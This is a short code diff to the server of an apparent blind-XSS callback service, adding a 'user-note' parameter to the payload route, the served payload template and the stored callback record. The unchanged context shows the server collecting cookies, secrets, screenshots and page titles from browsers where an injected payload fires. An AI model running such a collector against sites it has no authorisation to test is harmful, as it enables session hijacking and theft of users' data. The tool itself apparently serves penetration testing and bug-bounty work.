@@ -129,6 +129,10 @@ async function get_app_server() {
     const JSCallbackSchema = {
     	"type": "object",
     	"properties": {
+		"user-note":{
+			"type":"string",
+			"default":""
+		},
     		"uri": {
     			"type": "string",
     			"default": ""
@@ -205,6 +209,7 @@ async function get_app_server() {
             return res.redirect("/app/")
         }
         const userPath = req.body.path;
+
         if (!userPath){
             console.debug("req had no user path ID");
             return
@@ -317,7 +322,7 @@ async function get_app_server() {
                 cookies: req.body.cookies,
                 title: req.body.title,
                 secrets: JSON.parse(req.body.secrets),
-                origin: req.body.origin,
+                origin: `${req.body.origin} :: ${req.body['user-note']}`,
                 screenshot_id: payload_fire_image_id,
                 was_iframe: (req.body.was_iframe === 'true'),
                 browser_timestamp: parseInt(req.body['browser-time']),
@@ -399,7 +404,7 @@ async function get_app_server() {
         }
 
         console.log(`Got xss fetch for user id ${user.id}`);
-        
+        console.log (`Got user note from user of ${req.params.user_note}`);
         let chainload_uri = user.additionalJS;
         if (! chainload_uri){
             chainload_uri = '';
@@ -430,7 +435,10 @@ async function get_app_server() {
         ).replace(
             '[PROBE_ID]',
             JSON.stringify(req.params.probe_id)
-        ));
+        ).replace(
+	   '[USER_NOTE]',
+	   JSON.stringify(req.params.user_note)
+	));
     };
 
     // Handler that returns the XSS payload at the base path
@@ -448,9 +456,9 @@ async function get_app_server() {
         await api.set_up_api_server(app);
 	} else {
         console.log(`[INFO] Control panel NOT enabled. Not serving API or GUI server, only acting as a notification server...`);
-    }
+	}
 
-    app.get('/:probe_id', payload_handler);
+    app.get('/:probe_id/:user_note', payload_handler);
 
     return app;
 }
